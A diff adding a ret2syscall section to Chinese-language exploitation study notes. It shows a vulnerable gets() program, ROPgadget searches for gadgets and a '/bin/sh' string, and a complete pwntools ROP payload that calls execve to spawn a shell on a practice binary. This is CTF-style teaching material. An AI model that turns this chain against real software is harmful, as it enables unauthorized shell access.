@@ -205,4 +205,61 @@ ret2shellcode
   
    sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))  
    sh.interactive()  
- 
+   
+ret2syscall  
+ 控制程序执行系统调用，从而获取shell。  
+ 程序保护：  
+    ret2syscall checksec rop  
+    Arch:     i386-32-little  
+    RELRO:    Partial RELRO  
+    Stack:    No canary found  
+    NX:       NX enabled  
+    PIE:      No PIE (0x8048000)  
+  显然，nx开着。  
+  源程序：  
+    int __cdecl main(int argc, const char **argv, const char **envp)  
+   {  
+     int v4; // [sp+1Ch] [bp-64h]@1  
+  
+     setvbuf(stdout, 0, 2, 0);  
+     setvbuf(stdin, 0, 1, 0);  
+     puts("This time, no system() and NO SHELLCODE!!!");  
+     puts("What do you plan to do?");  
+     gets(&v4);  
+     return 0;  
+   }  
+  还是gets栈溢出，同上获得v4相对于ebp的偏移。  
+  但这次无法运用程序中的代码、或者自己填写代码来获取shell，需要利用程序中的gadgets获得shell，相应的即是利用系统调用。  
+     execve("/bin/sh",NULL,NULL)  
+  使用ropgadgets工具寻找gadgets（具体方法被墙了，后续补充），找到一个有ebx、ecx、edx权限的gadgets   
+     0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret  
+  /bin/sh对应的地址：  
+     ret2syscall ROPgadget --binary rop  --string '/bin/sh'   
+     Strings information  
+     ============================================================  
+     0x080be408 : /bin/sh  
+  int 0x80 的地址：  
+       ret2syscall ROPgadget --binary rop  --only 'int'                   
+       Gadgets information  
+       ============================================================  
+       0x08049421 : int 0x80  
+       0x080938fe : int 0xbb  
+       0x080869b5 : int 0xf6  
+       0x0807b4d4 : int 0xfc  
+  
+       Unique gadgets found: 4  
+  payload（ 0xb 是 execve）：  
+    #!/usr/bin/env python  
+    from pwn import *  
+  
+    sh = process('./rop')  
+  
+    pop_eax_ret = 0x080bb196  
+    pop_edx_ecx_ebx_ret = 0x0806eb90  
+    int_0x80 = 0x08049421  
+    binsh = 0x80be408  
+    payload = flat(  
+        ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])  
+    sh.sendline(payload)  
+    sh.interactive()  
+  
